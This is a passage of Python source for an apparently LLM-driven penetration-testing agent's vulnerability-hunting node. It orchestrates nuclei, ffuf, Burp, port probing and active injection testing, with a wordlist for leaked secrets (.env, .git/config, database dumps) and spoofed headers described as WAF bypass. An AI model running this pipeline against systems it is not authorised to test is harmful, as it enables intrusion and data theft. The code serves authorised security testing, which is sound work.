"""Vuln hunt node — active vulnerability scanning across all gathered endpoints.

Pipeline:
  1. nuclei  → template-based scanning (non-destructive templates only here)
  2. ffuf    → parameter/endpoint fuzzing on discovered endpoints
  3. Burp proxy history — pull any matching entries from Burp MCP (optional)
  4. LLM     → synthesize findings, classify severity, deduplicate

All scanning is guarded by scope check before each tool call.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os

from langchain_core.messages import AIMessage

from pentra_agent.graph.state import PentraState
from pentra_agent.llm.client import LLMClient
from pentra_agent.llm.dynamic_prompt import build_vuln_hunt_system_prompt
from pentra_agent.audit import write_audit_log
from pentra_shared.types import normalize_severity

try:
    from pentra_tools.mutation.payload_mutator import PayloadMutator as _PayloadMutator
    _PAYLOAD_MUTATOR = _PayloadMutator()
except ImportError:
    _PAYLOAD_MUTATOR = None  # type: ignore[assignment]

try:
    from pentra_tools.analysis.response_baseline import ResponseBaseline as _ResponseBaseline
    _RESPONSE_BASELINE_AVAILABLE = True
except ImportError:
    _ResponseBaseline = None  # type: ignore[assignment,misc]
    _RESPONSE_BASELINE_AVAILABLE = False

try:
    from pentra_tools.scanners.sqli_prover import SQLiProver as _SQLiProver
    _SQLI_PROVER_AVAILABLE = True
except ImportError:
    _SQLiProver = None  # type: ignore[assignment,misc]
    _SQLI_PROVER_AVAILABLE = False

try:
    from pentra_tools.burp.client import BurpMCPClient
    from pentra_tools.burp.exceptions import BurpConnectionError, BurpNotProError
    _BURP_AVAILABLE = True
except ImportError:
    _BURP_AVAILABLE = False

from pentra_scope import ScopeEnforcer
from pentra_scope.errors import ScopeViolationError

log = logging.getLogger(__name__)

# ── Task 18.9: Concurrent testing constants (overridden by Task 18.11 presets) ─
# Number of candidates tested in parallel. Semaphore limits burst to target/Burp.
# Set to 1 to disable concurrency (sequential fallback).
CONCURRENT_CANDIDATES: int = int(os.getenv("PENTRA_CONCURRENT_CANDIDATES", "3"))
# Polite inter-payload delay (seconds). Reduced vs sequential (was 0.5s).
_PAYLOAD_PACING_S: float = float(os.getenv("PENTRA_PAYLOAD_PACING", "0.15"))
# Task 18.11 preset-controlled limits
_MAX_CANDIDATES: int = int(os.getenv("PENTRA_MAX_CANDIDATES", "20"))
_MAX_PAYLOADS_PER_CANDIDATE: int = int(os.getenv("PENTRA_MAX_PAYLOADS", "4"))
_RUN_NUCLEI: bool = os.getenv("PENTRA_RUN_NUCLEI", "true").lower() == "true"
_RUN_FFUF: bool = os.getenv("PENTRA_RUN_FFUF", "true").lower() == "true"
_RUN_BURP_SCAN: bool = os.getenv("PENTRA_RUN_BURP_SCAN", "true").lower() == "true"
_RUN_SOAP_XXE: bool = os.getenv("PENTRA_RUN_SOAP_XXE", "true").lower() == "true"
_RUN_CSRF_CHECK: bool = os.getenv("PENTRA_RUN_CSRF_CHECK", "true").lower() == "true"
_CRAWL_PAGES: int = int(os.getenv("PENTRA_CRAWL_PAGES", "49"))
_NUCLEI_TIMEOUT_S: int = int(os.getenv("PENTRA_NUCLEI_TIMEOUT", "300"))  # raised Task 20.3


# ── Burp MCP config helpers ───────────────────────────────────────────────────

def _get_burp_config() -> tuple[str | None, bool]:
    """Read Burp MCP config from environment.

    Returns:
        (burp_url, is_enabled) — burp_url is None if BURP_MCP_URL is not set.
    """
    url = os.getenv("BURP_MCP_URL", "").strip()
    enabled = os.getenv("BURP_MCP_ENABLED", "false").lower() == "true"
    return (url if url else None, enabled)


def _get_burp_proxy() -> str | None:
    """Return Burp proxy URL for routing tool traffic through Burp.

    Set BURP_PROXY_URL=http://localhost:8080 in .env to enable.
    Only active when BURP_MCP_ENABLED=true.
    """
    _, enabled = _get_burp_config()
    if not enabled:
        return None
    proxy = os.getenv("BURP_PROXY_URL", "").strip()
    return proxy if proxy else None


async def _check_burp_connection(burp_url: str) -> bool:
    """Verify Burp MCP server is reachable via health check.

    Logs INFO on success and WARNING on failure so operators always
    know whether Burp is active for this run.
    """
    if not _BURP_AVAILABLE:
        log.warning(
            "[vuln_hunt_node] pentra-tools Burp module not installed — "
            "skipping Burp integration"
        )
        return False
    try:
        client = BurpMCPClient(base_url=burp_url)
        ok = await client.health_check()
        if ok:
            log.info("[vuln_hunt_node] Burp MCP connected at %s", burp_url)
        else:
            log.warning(
                "[vuln_hunt_node] Burp MCP health check FAILED at %s — "
                "skipping Burp integration",
                burp_url,
            )
        return ok
    except Exception as exc:
        log.warning(
            "[vuln_hunt_node] Burp MCP unreachable at %s: %s — "
            "skipping Burp integration",
            burp_url,
            exc,
        )
        return False


async def _noop_list() -> list:
    """Async no-op returning empty list — used when a tool is disabled by preset."""
    return []


async def vuln_hunt_node(state: PentraState) -> dict:
    """Orchestrate active vuln scanning across discovered endpoints."""
    domain = state["target"]["domain"]
    endpoints = state.get("endpoints", [])
    tech_stack = state.get("tech_stack", [])
    knowledge_context = state.get("knowledge_context", [])

    current_round = state.get("hunt_rounds", 0)
    log.info("[vuln_hunt_node] Starting hunt round %d for %s (%d endpoints)", current_round + 1, domain, len(endpoints))

    # On re-entry from DO NOT STOP routing, focus on chain suggestions
    if current_round > 0:
        chain_required = [
            f for f in state.get("triaged_findings", [])
            if f.get("triage_verdict") == "CHAIN_REQUIRED"
        ]
        if chain_required:
            chain_hints = [
                f.get("chain_suggestion", "") for f in chain_required if f.get("chain_suggestion")
            ]
            log.info("[vuln_hunt_node] Chain round — focusing on: %s", chain_hints[:3])

    # ── Compress message history if approaching context limit ─────────────────
    try:
        from pentra_agent.llm.summarizer import maybe_summarize
        _msgs = await maybe_summarize(
            list(state.get("messages", [])),
            llm=LLMClient(base_url=_ollama_url(), model=state["llm_model"]),
        )
    except Exception as _sum_exc:
        log.debug("[vuln_hunt_node] summarizer failed (non-fatal): %s", _sum_exc)
        _msgs = list(state.get("messages", []))

    raw_findings: list[dict] = []

    # ── 1–4.5. Run all passive/scan tools CONCURRENTLY ────────────────────────
    # Each tool is I/O-bound (network/subprocess) and independent — running them
    # in parallel cuts wall-clock time from ~sum(all timeouts) to ~max(longest).
    # Task 18.11: preset flags gate individual tools on/off.
    log.info(
        "[vuln_hunt_node] Launching tools concurrently "
        "[nuclei=%s ffuf=%s burp_scan=%s soap_xxe=%s csrf=%s]",
        _RUN_NUCLEI, _RUN_FFUF, _RUN_BURP_SCAN, _RUN_SOAP_XXE, _RUN_CSRF_CHECK,
    )
    (
        nuclei_results,
        ffuf_results,
        burp_scan_results,
        burp_proxy_results,
        burp_extended,
        soap_xxe_results,
        graphql_results,
        race_condition_results,
        cors_results,
        jwt_results,
        second_order_results,
        biz_logic_results,
        ssrf_results,
    ) = await asyncio.gather(
        _run_nuclei(endpoints, state["scope"], tech_stack=state.get("tech_stack", [])) if _RUN_NUCLEI else _noop_list(),
        _run_ffuf(endpoints[:5]) if _RUN_FFUF else _noop_list(),
        _run_burp_active_scan(endpoints[:10], state["scope"]) if _RUN_BURP_SCAN else _noop_list(),
        _get_burp_proxy_findings(domain, state["scope"]),
        _run_burp_extended_checks(domain, state["scope"], endpoints),
        _run_soap_xxe_scan(domain, state["scope"], state.get("auth_credentials")) if _RUN_SOAP_XXE else _noop_list(),
        _run_graphql_scan(domain, state["scope"], state.get("auth_credentials")),
        _run_race_condition_scan(endpoints, state["scope"], state.get("auth_credentials")),
        _run_cors_scan(endpoints, state["scope"], state.get("auth_credentials")),
        _run_jwt_scan(domain, state["scope"], state.get("auth_credentials"), state),
        _run_second_order_sqli_scan(domain, state["scope"], state.get("auth_credentials")),
        _run_business_logic_scan(domain, state["scope"], state.get("auth_credentials")),
        _run_ssrf_scan(endpoints, state["scope"], state.get("auth_credentials")),
        return_exceptions=False,
    )
    raw_findings.extend(nuclei_results)
    raw_findings.extend(ffuf_results)
    raw_findings.extend(burp_scan_results)
    raw_findings.extend(burp_proxy_results)
    raw_findings.extend(burp_extended)
    raw_findings.extend(soap_xxe_results)
    raw_findings.extend(graphql_results)
    raw_findings.extend(race_condition_results)
    raw_findings.extend(cors_results)
    raw_findings.extend(jwt_results)
    raw_findings.extend(second_order_results)
    raw_findings.extend(biz_logic_results)
    raw_findings.extend(ssrf_results)
    log.info(
        "[vuln_hunt_node] Concurrent scan done: nuclei=%d ffuf=%d burp_scan=%d proxy=%d ext=%d soap_xxe=%d graphql=%d race=%d cors=%d jwt=%d 2nd_sqli=%d biz=%d ssrf=%d",
        len(nuclei_results), len(ffuf_results), len(burp_scan_results),
        len(burp_proxy_results), len(burp_extended), len(soap_xxe_results),
        len(graphql_results), len(race_condition_results), len(cors_results), len(jwt_results),
        len(second_order_results), len(biz_logic_results), len(ssrf_results),
    )

    # ── 5. Collaborator payload (expose in tool_outputs for LLM) ─────────────
    collaborator_output: list[dict] = []
    collab = await _get_collaborator_payload(
        custom_data=f"pentra-{state['engagement_id'][:8]}",
        scope=state["scope"],
        domain=domain,
    )
    if collab:
        collaborator_output.append(collab)

    # ── 6. LLM-driven active exploit testing via Burp ────────────────────────
    # Pre-fetch KB context BEFORE active testing so the LLM has historical
    # patterns to guide payload selection — not just after-the-fact context.
    _prescan_kb = await _kb_prefetch(
        tech_stack=tech_stack,
        endpoints=endpoints,
        domain=domain,
    )
    if _prescan_kb:
        log.info("[vuln_hunt_node] KB prefetch: %d relevant records for %s", len(_prescan_kb), domain)
    else:
        log.info("[vuln_hunt_node] KB prefetch returned 0 records — cold-start or Qdrant empty")

    # ── Build dynamic system prompt (ARTEMIS Task 18.5) ──────────────────────
    # Prompt adapts per target: tech stack, prior findings, WAF profile.
    # Applied only to the active-testing LLM — classification stays neutral.
    _dynamic_system = build_vuln_hunt_system_prompt(
        tech_stack=tech_stack,
        prior_findings=state.get("findings", []),
        engagement_learnings=knowledge_context,
        waf_info=state.get("waf_info"),
    )
    log.debug("[vuln_hunt_node] Dynamic system prompt length: %d chars", len(_dynamic_system))

    _llm_for_active = LLMClient(
        base_url=_ollama_url(),
        model=state["llm_model"],
        system_override=_dynamic_system,
    )
    try:
        llm_burp_results, csrf_results = await asyncio.gather(
            _run_llm_burp_active_testing(
                domain=domain,
                endpoints=endpoints,
                scope=state["scope"],
                tech_stack=tech_stack,
                llm=_llm_for_active,
                engagement_id=state["engagement_id"],
                pentest_plan=state.get("pentest_plan", ""),
                kb_context=_prescan_kb,
                auth_credentials=state.get("auth_credentials"),
            ),
            _passive_csrf_check(domain, state["scope"]) if _RUN_CSRF_CHECK else _noop_list(),
        )
        raw_findings.extend(llm_burp_results)
        raw_findings.extend(csrf_results)
    except Exception as exc:
        log.warning("[vuln_hunt_node] LLM active testing error: %s", exc)

    # ── 7. LLM synthesis — classify all raw findings CONCURRENTLY ─────────────
    # Each classify_finding call is a separate LLM completion — they're independent
    # and can run in parallel. Limit concurrency to 4 to avoid overloading Ollama.
    llm = LLMClient(base_url=_ollama_url(), model=state["llm_model"])

    async def _classify_one(raw: dict) -> dict:
        try:
            classification = await llm.classify_finding(
                title=raw.get("title", "Potential Finding"),
                description=raw.get("description", ""),
                request=raw.get("request", ""),
                response=raw.get("response", ""),
            )
            return {**raw, **classification}
        except Exception as exc:
            log.warning("[vuln_hunt_node] classify_finding failed: %s", exc)
            return raw

    _sem = asyncio.Semaphore(4)  # max 4 concurrent LLM calls — avoid Ollama queue backup

    async def _classify_guarded(raw: dict) -> dict:
        async with _sem:
            return await _classify_one(raw)

    classified: list[dict] = list(
        await asyncio.gather(*[_classify_guarded(r) for r in raw_findings])
    )

    # Deduplicate by title+url
    seen_keys: set[str] = set()
    deduped: list[dict] = []
    for f in classified:
        key = f"{f.get('title', '')}|{f.get('target_url', '')}"
        if key not in seen_keys:
            seen_keys.add(key)
            deduped.append(f)

    # Post-scan KB refresh: use specific vuln classes found + tech stack for
    # better query targeting. Store compact format in state for report_node.
    vuln_classes = list({f.get("vuln_class", "") for f in deduped if f.get("vuln_class")})
    updated_knowledge: list[dict] = knowledge_context
    if vuln_classes:
        try:
            from pentra_knowledge.services.search import hybrid_search

            from app.db.base import _get_session_factory

            async with _get_session_factory()() as db:
                # Build a targeted query: specific classes + tech context
                vc_str = ", ".join(vuln_classes[:4])
                tech_str = " ".join(tech_stack[:3]) if tech_stack else ""
                rag_query = (
                    f"{vc_str} exploitation bypass technique"
                    + (f" on {tech_str}" if tech_str else "")
                )
                records = await hybrid_search(
                    query=rag_query,
                    db=db,
                    vuln_class=vuln_classes if vuln_classes else None,
                    top_k=8,
                    min_quality_score=0.0,   # 0.0: don't gate on quality_score
                )
            updated_knowledge = [r.model_dump() for r in records]
            log.info(
                "[vuln_hunt_node] KB refresh: query=%r → %d records",
                rag_query[:80], len(updated_knowledge),
            )
        except Exception as exc:
            log.warning("[vuln_hunt_node] KB refresh failed: %s", exc)

    summary_msg = (
        f"**Vulnerability Hunt Complete** for `{domain}`\n\n"
        f"- Raw findings: {len(raw_findings)}\n"
        f"- After deduplication: {len(deduped)}\n"
        f"- High/Critical: {sum(1 for f in deduped if f.get('severity') in ('high', 'critical'))}\n\n"
        + (
            "**Findings:**\n"
            + "\n".join(
                f"- [{f.get('severity','?').upper()}] {f.get('title','?')} @ {f.get('target_url','?')}"
                for f in deduped[:10]
            )
            if deduped
            else "_No findings discovered._"
        )
    )

    return {
        "findings": deduped,
        "current_phase": "vuln_hunt",
        "phase_history": ["vuln_hunt"],
        "knowledge_context": updated_knowledge,
        "tool_outputs": collaborator_output,
        "messages": [AIMessage(content=summary_msg)],
        "hunt_rounds": current_round + 1,
    }


# ── Tool helpers ──────────────────────────────────────────────────────────────


async def _kb_prefetch(
    tech_stack: list[str],
    endpoints: list[dict],
    domain: str,
) -> list[dict]:
    """Multi-query KB prefetch executed BEFORE active testing begins.

    Returns a deduplicated list of KnowledgeRecord dicts (compact fields only)
    so the LLM can use historical attack patterns to guide payload selection.

    Why pre-fetch, not post-hoc:
        The LLM needs KB context BEFORE deciding which payloads to craft and
        which candidates to prioritise. Post-hoc injection (after scanning) only
        helps the report node, not the attacker loop.

    Query strategy:
        1. Tech-stack attack patterns  (e.g. "SQL injection PHP Laravel")
        2. Auth + access-control techniques  (always relevant)
        3. Interesting parameter patterns from discovered endpoints
    """
    try:
        from pentra_knowledge.services.search import hybrid_search
        from app.db.base import _get_session_factory
    except ImportError:
        return []

    # Build queries
    queries: list[str] = []

    if tech_stack:
        queries.append(
            f"vulnerability exploitation {' '.join(tech_stack[:3])} bypass technique"
        )

    # Always fetch auth + IDOR patterns (highest-value, most universal)
    queries.append("authentication bypass IDOR privilege escalation access control")

    # Extract interesting param names from endpoints for injection context
    param_names: set[str] = set()
    for ep in endpoints[:30]:
        for p in ep.get("params", []):
            name = (p.get("name") or "").strip().lower()
            if len(name) >= 2:
                param_names.add(name)
    injection_hints = [
        n for n in param_names
        if any(kw in n for kw in (
            "id", "user", "file", "path", "url", "page", "key",
            "token", "cmd", "exec", "query", "search", "input",
        ))
    ][:6]
    if injection_hints:
        queries.append(f"injection {' '.join(injection_hints)} parameter manipulation")

    # Run all queries concurrently, merge + deduplicate results
    all_records: dict[str, dict] = {}
    try:
        async with _get_session_factory()() as db_session:
            import asyncio as _asyncio
            results = await _asyncio.gather(
                *[
                    hybrid_search(q, db_session, top_k=5, min_quality_score=0.0)
                    for q in queries
                ],
                return_exceptions=True,
            )
            for batch in results:
                if isinstance(batch, Exception):
                    log.debug("[_kb_prefetch] query failed (non-fatal): %s", batch)
                    continue
                for record in batch:
                    all_records[str(record.id)] = record.model_dump()
    except Exception as exc:
        log.warning("[_kb_prefetch] KB prefetch failed (non-fatal): %s", exc)
        return []

    return list(all_records.values())[:12]


async def _run_nuclei(
    endpoints: list[dict],
    scope: dict,
    tech_stack: list[str] | None = None,
) -> list[dict]:
    """Run nuclei with non-destructive templates on in-scope endpoints.

    Runs two parallel nuclei passes:
    1. All templates against full HTTP URL targets.
    2. TCP/JS network templates only against ``hostname:port`` entries for
       every open service port discovered on the target host.  This ensures
       services like Redis, PostgreSQL, etc. are scanned even when the HTTP
       endpoint is unreachable.
    """
    import shutil
    from urllib.parse import urlparse

    if not endpoints:
        return []
    in_scope = scope.get("in_scope", [])

    url_targets: list[str] = [
        e["url"] for e in endpoints
        if e.get("url") and _is_in_scope(e["url"], in_scope)
    ][:20]
    if not url_targets:
        return []

    # Probe HTTPS reachability once — if port 443 is closed, rewrite all https://
    # targets to http:// so nuclei doesn't spend 10s per template timing out.
    from urllib.parse import urlparse as _up_n
    _https_hosts: set[str] = {_up_n(u).hostname for u in url_targets if u.startswith("https://")}
    _reachable_https: set[str] = set()
    for _h in _https_hosts:
        try:
            _r, _w = await asyncio.wait_for(asyncio.open_connection(_h, 443), timeout=5.0)
            _w.close()
            _reachable_https.add(_h)
        except Exception:
            pass
    url_targets = [
        ("http://" + u[8:]) if (u.startswith("https://") and _up_n(u).hostname not in _reachable_https) else u
        for u in url_targets
    ]
    log.info("[vuln_hunt_node] nuclei url_targets after HTTPS probe: %s", url_targets)

    # Discover open service ports on each unique hostname
    COMMON_SERVICE_PORTS = [
        21, 22, 23, 25, 110, 143, 389, 443, 445, 1433, 1521,
        3306, 3389, 5432, 5672, 5900, 6379, 6380, 7001, 8080,
        8443, 8888, 9000, 9200, 9300, 11211, 27017, 28017,
    ]
    seen_hosts: set[str] = set()
    network_targets: list[str] = []
    for url in url_targets:
        host = urlparse(url).hostname or ""
        if not host or host in seen_hosts:
            continue
        seen_hosts.add(host)
        open_ports = await _probe_open_ports(host, COMMON_SERVICE_PORTS)
        for port in open_ports:
            network_targets.append(f"{host}:{port}")

    # Prefer known absolute path; fall back to PATH lookup so it works in containers too.
    _NUCLEI_CANDIDATES = ["/home/mdilab/go/bin/nuclei", "/usr/local/bin/nuclei", "/usr/bin/nuclei"]
    nuclei_bin = next(
        (p for p in _NUCLEI_CANDIDATES if shutil.which(p) or __import__("os").path.isfile(p)),
        shutil.which("nuclei") or "nuclei",
    )
    log.info(
        "[vuln_hunt_node] nuclei=%s | http_targets=%s | net_targets=%s",
        nuclei_bin, url_targets, network_targets,
    )

    # Build tech-stack-specific extra tags so IIS/ASP.NET/MSSQL targets get relevant templates
    _extra_tags: list[str] = []
    _ts_lower = [t.lower() for t in (tech_stack or [])]
    if any(t in _ts_lower for t in ("iis", "asp", "asp.net", "aspnet", "dotnet", ".net")):
        _extra_tags += ["iis", "asp", "aspnet", "dotnet", "viewstate"]
        log.info("[vuln_hunt_node] nuclei: IIS/ASP.NET detected — adding tags: %s", _extra_tags)
    if any(t in _ts_lower for t in ("mssql", "sql server", "sqlserver")):
        _extra_tags += ["mssql"]

    # Run HTTP and network scans concurrently — they target different protocols so
    # there's no CPU/template contention.
    # Task 20.3: raised HTTP timeout from 180s → 300s to accommodate:
    #   30s per-request × 5 concurrent × ~8 targets × ~20 key templates = ~240s worst case
    # Network scan timeout unchanged at 120s (no time-based templates).
    http_findings, net_findings = await asyncio.gather(
        _nuclei_scan(nuclei_bin, url_targets, protocol_types=None, timeout=300, extra_tags=_extra_tags),
        _nuclei_scan(nuclei_bin, network_targets, protocol_types=["tcp", "javascript"], timeout=120),
    )
    findings = http_findings + net_findings
    log.info("[vuln_hunt_node] nuclei: http=%d net=%d total=%d", len(http_findings), len(net_findings), len(findings))
    return findings


async def _nuclei_scan(
    nuclei_bin: str,
    targets: list[str],
    protocol_types: list[str] | None,
    timeout: int = 300,
    extra_tags: list[str] | None = None,
) -> list[dict]:
    """Internal helper: run one nuclei pass and return parsed findings."""
    if not targets:
        return []

    import tempfile

    _BASE_TAGS = (
        # Core vulnerability classes — high yield templates only.
        # Task 20.3 fix: removed tags already covered by our own tools
        # (jwt→jwt_tester, takeover→takeover_detector, cors→cors_tester,
        #  xxe→soap_xxe_scanner, redirect→cors_tester, graphql→graphql_analyzer)
        # to reduce template count (was ~570 → now ~250) and focus on what
        # nuclei does better than our tools: CVE detection, misconfigs, exposures.
        "cve,vuln,sqli,xss,lfi,rce,exposure,misconfig,default-login,injection,ssti"
    )
    _all_tags = _BASE_TAGS + ("," + ",".join(extra_tags) if extra_tags else "")
    cmd = [
        nuclei_bin,
        "-severity", "info,low,medium,high,critical",
        "-exclude-tags", "intrusive,dos",
        # Use correct nuclei tag names (checked against ~/nuclei-templates/ tag index).
        # vuln=6614 templates, cve=4179, xss=1401, lfi=846, rce=945,
        # exposure=1426, misconfig=972, sqli=581, default-login=226.
        "-tags", _all_tags,
        "-jsonl",
        "-silent",
        "-duc",   # disable update check — avoids lock conflicts on concurrent runs
        # Task 20.3 — nuclei 0-findings fix:
        # Root cause: -ni disabled interactsh AND per-request timeout was too short
        # for time-based SQLi (WAITFOR DELAY 10s + network overhead).
        # Fix:
        #   1. Remove -ni: interactsh is available and needed for blind/OOB detection
        #   2. Raise -timeout from 15s → 30s: WAITFOR DELAY templates need room to fire
        #   3. Add -retries 1: one retry for transient slow responses
        #   4. Lower -c from 10 → 5: reduce concurrency so timing-based templates are reliable
        "-timeout", "30",   # per-request timeout — must exceed any SLEEP/WAITFOR delay
        "-retries", "1",    # one retry for transient failures
        "-c", "5",          # lower concurrency: timing attacks need stable measurements
        # Add common WAF-bypass headers so templates see realistic responses
        "-H", "X-Forwarded-For: 127.0.0.1",
        "-H", "X-Real-IP: 127.0.0.1",
    ]
    if protocol_types:
        cmd += ["-pt", ",".join(protocol_types)]

    # Write targets to a temp file — /dev/stdin is unreliable when nohup closes fd 0
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, prefix="nuclei-targets-") as tf:
        tf.write("\n".join(targets))
        targets_file = tf.name
    cmd += ["-list", targets_file]

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            log.warning(
                "[vuln_hunt_node] nuclei timed out after %ds (%s) — killing process",
                timeout, protocol_types,
            )
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            await proc.wait()
            return []
        if stderr:
            log.info("[vuln_hunt_node] nuclei stderr (%s): %s", protocol_types, stderr[:500].decode(errors="replace"))
        findings = _parse_nuclei_jsonl(stdout.decode())
        if not findings:
            log.warning(
                "[vuln_hunt_node] nuclei 0 findings (%s) — "
                "stdout=%d bytes  stderr=%s  exit=%s",
                protocol_types,
                len(stdout),
                (stderr[:300].decode(errors="replace") if stderr else ""),
                proc.returncode,
            )
        else:
            log.info(
                "[vuln_hunt_node] _nuclei_scan(%s) → %d findings (exit=%s)",
                protocol_types, len(findings), proc.returncode,
            )
        return findings
    except FileNotFoundError:
        log.warning("[vuln_hunt_node] nuclei not found — skipping")
        return []
    except Exception as exc:
        log.warning("[vuln_hunt_node] nuclei scan error (%s): %s", protocol_types, exc)
        return []
    finally:
        import os
        try:
            os.unlink(targets_file)
        except OSError:
            pass


async def _probe_open_ports(host: str, ports: list[int], timeout: float = 1.0) -> list[int]:
    """Return the subset of *ports* that accept a TCP connection on *host*."""
    open_ports: list[int] = []

    async def check(port: int) -> None:
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            open_ports.append(port)
        except Exception:
            pass

    await asyncio.gather(*[check(p) for p in ports])
    log.debug("[vuln_hunt_node] open ports on %s: %s", host, sorted(open_ports))
    return open_ports



def _parse_nuclei_jsonl(output: str) -> list[dict]:
    results: list[dict] = []
    for line in output.splitlines():
        try:
            obj = json.loads(line)
            results.append({
                "title": obj.get("info", {}).get("name", "Nuclei Finding"),
                "description": obj.get("info", {}).get("description", ""),
                "severity": normalize_severity(obj.get("info", {}).get("severity", "info")), 
                "target_url": obj.get("matched-at", obj.get("host", "")),
                "vuln_class": _nuclei_tags_to_vuln_class(obj.get("info", {}).get("tags", [])),
                "request": obj.get("request", ""),
                "response": obj.get("response", ""),
                "source": "nuclei",
                "template_id": obj.get("template-id", ""),
            })
        except (json.JSONDecodeError, KeyError):
            continue
    return results


async def _run_ffuf(endpoints: list[dict]) -> list[dict]:
    """Multi-mode ffuf scan: (A) sensitive-file discovery, (B) path enumeration."""
    import shutil

    findings: list[dict] = []
    ffuf_bin = shutil.which("ffuf") or "ffuf"

    if not endpoints:
        return []

    base_url = ""
    for ep in endpoints[:1]:
        url = ep.get("url", "")
        if url:
            from urllib.parse import urlparse as _up_f
            p = _up_f(url)
            base_url = f"{p.scheme}://{p.netloc}"
    if not base_url:
        return []

    # Mode A: Sensitive file / backup detection
    _SENSITIVE_PATHS = "\n".join([
        ".env", ".env.local", ".env.production", ".env.backup",
        ".git/HEAD", ".git/config", ".gitignore",
        "web.config", "Web.config", "webconfig.xml",
        "config.php", "config.bak", "config.old",
        "backup.zip", "backup.tar.gz", "dump.sql",
        "phpinfo.php", "info.php", "test.php",
        "debug", "debug.aspx", "trace.axd",
        "elmah.axd", "ScriptResource.axd",
        "actuator", "actuator/env", "actuator/health",
        "swagger.json", "openapi.json", "api-docs",
        "robots.txt", "sitemap.xml", "crossdomain.xml",
        "readme.txt", "CHANGELOG", "LICENSE",
    ])
    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, prefix="ffuf-sensitive-") as tf:
        tf.write(_SENSITIVE_PATHS)
        sensitive_wordlist = tf.name

    try:
        proc = await asyncio.create_subprocess_exec(
            ffuf_bin,
            "-u", f"{base_url}/FUZZ",
            "-w", sensitive_wordlist,
            "-mc", "200,201,301,302,403",
            "-t", "10", "-timeout", "5", "-json", "-recursion", "0",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
        try:
            data = json.loads(stdout.decode())
            for r in data.get("results", []):
                hit_url = r.get("url", "")
                status = r.get("status", 0)
                length = r.get("length", 0)
                # Skip common false-positives (tiny responses are usually custom 404)
                if length < 20:
                    continue
                severity = "high" if any(x in hit_url for x in [".env", ".git", "config", "backup", "dump"]) else "medium"
                findings.append({
                    "title": f"Sensitive File Exposed: {hit_url.split('/')[-1]}",
                    "description": f"Status {status}, Length {length} — sensitive file accessible without authentication.",
                    "severity": severity,
                    "target_url": hit_url,
                    "vuln_class": "Information Disclosure",
                    "request": f"GET {hit_url}",
                    "response": f"HTTP {status} — {length} bytes",
                    "source": "ffuf_sensitive",
                })
        except (json.JSONDecodeError, Exception):
            pass
    except FileNotFoundError:
        log.debug("[vuln_hunt_node] ffuf not found — skipping sensitive file scan")
        return []
    except Exception as exc:
        log.debug("[vuln_hunt_node] ffuf sensitive scan error: %s", exc)
    finally:
        import os as _os
        try:
            _os.unlink(sensitive_wordlist)
        except OSError:
            pass

    # Mode B: Common path discovery (keep original dirb scan on first 3 endpoints)
    for ep in endpoints[:3]:
        url = ep.get("url", "")
        if not url:
            continue
        try:
            proc = await asyncio.create_subprocess_exec(
                ffuf_bin,
                "-u", f"{url.rstrip('/')}/FUZZ",
                "-w", "/usr/share/wordlists/dirb/common.txt",
                "-mc", "200,201,301,302,403",
                "-t", "10", "-timeout", "5", "-json", "-recursion", "0",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
            try:
                data = json.loads(stdout.decode())
                for r in data.get("results", []):
                    if r.get("length", 0) < 20:
                        continue
                    findings.append({
                        "title": f"Discovered endpoint: {r.get('url', '')}",
                        "description": f"Status {r.get('status')}, Length {r.get('length')}",
                        "severity": "info",
                        "target_url": r.get("url", ""),
                        "vuln_class": "Information Disclosure",
                        "request": "", "response": "",
                        "source": "ffuf",
                    })
            except json.JSONDecodeError:
                pass
        except FileNotFoundError:
            log.debug("[vuln_hunt_node] ffuf not found — skipping path discovery")
            break
        except Exception as exc:
            log.debug("[vuln_hunt_node] ffuf error for %s: %s", url, exc)

    return findings


async def _get_burp_proxy_findings(domain: str, scope: dict) -> list[dict]:
    """Pull Burp proxy history via BurpMCPClient; map to finding dicts."""
    burp_url, burp_enabled = _get_burp_config()
    if not burp_url:
        log.info(
            "[vuln_hunt_node] BURP_MCP_URL not set — Burp proxy history disabled. "
            "Set BURP_MCP_URL=http://127.0.0.1:9876 in .env to enable."
        )
        return []
    if not burp_enabled:
        log.info("[vuln_hunt_node] BURP_MCP_ENABLED=false — Burp proxy history disabled.")
        return []
    if not _BURP_AVAILABLE:
        log.warning("[vuln_hunt_node] pentra-tools Burp module not available — skipping proxy history")
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    out_of_scope: list[str] = scope.get("out_of_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=out_of_scope)
    try:
        enforcer.validate_or_raise(domain)
    except ScopeViolationError as exc:
        log.warning("[vuln_hunt_node] Burp proxy history skipped — scope: %s", exc)
        return []

    client = BurpMCPClient(base_url=burp_url)
    if not await client.health_check():
        log.info("[vuln_hunt_node] Burp not reachable — skipping proxy history")
        return []

    async with client.managed_session():
        try:
            import re as _re
            escaped = _re.escape(domain)
            history = await client.get_proxy_history(filter_regex=escaped, limit=100)
            findings: list[dict] = []
            for entry in history:
                # Scope check each entry before processing
                try:
                    enforcer.validate_or_raise(entry.url)
                except ScopeViolationError:
                    continue
                if entry.request and entry.response:
                    findings.append({
                        "title": f"Burp proxy capture: {entry.method} {entry.url}",
                        "description": (
                            f"Intercepted request/response pair from Burp proxy history. "
                            f"Status: {entry.response_status}"
                        ),
                        "severity": "info",
                        "target_url": entry.url,
                        "vuln_class": "Unknown",
                        "request": entry.request or "",
                        "response": entry.response or "",
                        "source": "burp_proxy_mcp",
                    })
            # ── Cookie / token decode analysis ────────────────────────────────
            # Decode interesting cookie values from proxy history to surface
            # information disclosure (JWT secrets, base64-encoded role flags, etc.)
            try:
